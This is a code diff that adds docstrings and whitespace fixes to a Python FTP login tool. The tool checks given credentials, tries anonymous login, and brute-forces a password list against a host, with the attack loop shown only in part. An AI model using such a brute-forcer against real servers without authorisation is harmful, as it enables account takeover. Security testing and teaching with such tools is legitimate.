@@ -4,6 +4,13 @@ import sys
 from termcolor import colored
 
 def check_login(host,user,pwd):
+    """check if the given logins are correct or not.
+
+    Arguments:
+        host {str} -- host to connect to
+        user {str} -- username
+        pwd {str} -- password
+    """
     try:
         FTP = ftplib.FTP(host)
         FTP.login(user,pwd)
@@ -15,6 +22,11 @@ def check_login(host,user,pwd):
         pass
 
 def default_login(host):
+    """Check for default logins.
+
+    Arguments:
+        host {str} -- Host to check for this.
+    """
     try:
         FTP = ftplib.FTP(host)
         FTP.login()
@@ -22,8 +34,10 @@ def default_login(host):
         exit(0)
     except:
         pass
-    
+
 def brute_login(host,username,passfile):
+    """Bruteforce logins for given host.
+    """
     try:
         print(colored("[+]Attacking {} with username {}".format(host,username),"blue",attrs=["reverse","blink"]))
         passfile = open(passfile,"r")
@@ -35,7 +49,7 @@ def brute_login(host,username,passfile):
     except Exception as E:
         print(E)
         print(colored("[!]None of the Password Matched/Other issue encountered!","red",attrs=["underline"]))
-    
+
 def main():
     host = input("Enter Host Address:")
     file = input("Enter Filename:")
@@ -49,4 +63,4 @@ def main():
 
 
 
-    
+
